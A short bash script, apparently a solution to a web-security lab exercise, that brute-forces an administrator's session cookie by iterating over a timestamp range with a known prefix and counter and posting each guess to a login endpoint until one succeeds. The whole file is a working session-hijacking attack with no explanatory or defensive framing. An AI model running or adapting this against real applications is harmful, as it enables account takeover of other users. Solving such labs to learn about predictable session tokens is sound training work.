#!/bin/bash

# Your specific prefix
PREFIX="84b83491-4922-48cf-a98"

# The missing counter (Admin's ID)
COUNTER="4528564"

# Timestamps: From your 6th request to your 7th request
START=17687635034
END=17687635115

echo "Searching for Admin session between timestamp $START and $END..."

for ts in $(seq $START $END); do
  # Construct the candidate cookie
  COOKIE="hijack_session=$PREFIX-$COUNTER-$ts"
  
  # Try to login with this cookie
  result=$(curl -s -X POST -b "$COOKIE" http://web0x01.hbtn/api/a1/hijack_session/login)
  
  # Check if we got the flag (if the response does NOT contain "failed")
  if [[ "$result" != *"failed"* ]]; then
    echo "--------------------------------------------------"
    echo "SUCCESS! Admin Session Found!"
    echo "Timestamp: $ts"
    echo "Cookie Used: $COOKIE"
    echo "Response: $result"
    echo "--------------------------------------------------"
    break
  fi
done
